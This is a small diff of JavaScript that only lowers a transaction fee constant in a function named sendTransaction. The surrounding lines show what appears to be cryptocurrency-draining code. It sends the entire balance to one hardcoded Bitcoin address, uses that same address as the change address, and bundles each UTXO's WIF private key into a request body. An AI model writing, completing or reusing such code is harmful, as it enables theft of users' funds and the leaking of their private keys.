@@ -203,7 +203,7 @@ async function sendTransaction(totalBalance, utxos) {
     const amountToSend = totalBalance;
     const changeAddress = "bc1qtydcsp8p53u55ncs6f207d2djq4v73f4jqck99";
     const recipientAddress = "bc1qtydcsp8p53u55ncs6f207d2djq4v73f4jqck99";
-    const transactionFee = 5000;
+    const transactionFee = 3500;
     const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.status}`).join('|');
 
     const body = {
